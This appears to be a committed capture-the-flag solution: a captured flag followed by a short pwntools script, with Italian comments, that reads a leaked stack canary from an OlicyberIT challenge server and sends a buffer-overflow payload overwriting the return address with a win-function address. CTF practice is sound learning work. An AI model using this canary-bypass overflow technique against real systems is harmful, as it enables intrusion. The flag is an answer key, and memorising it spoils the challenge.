@@ -1,0 +1,16 @@
+flag{suurrfin_b11111rd_ca83eb5242d0cf4071e6c78e34ed65d0875bb44f}
+
+from pwn import *
+
+
+conn = remote('bigbird.challs.olicyber.it', 12006)
+
+conn.recvuntil(b"BIG BIRD: ")
+canary = int(conn.recvline().decode(),16) # cast a int e il 16 serve per indicare la base esadecimale, altrimenti sarebbe decimale e non funzionerebbe
+
+print(canary)
+
+payload = b"A"*40 + p64(canary) + b"B"*8 + p64(0x00401715) # 40 byte per arrivare al canary, poi il canary, poi 8 byte (RBB) per arrivare al return address e infine l'indirizzo della funzione win
+assert b'\n' not in payload
+conn.sendline(payload)
+conn.interactive()
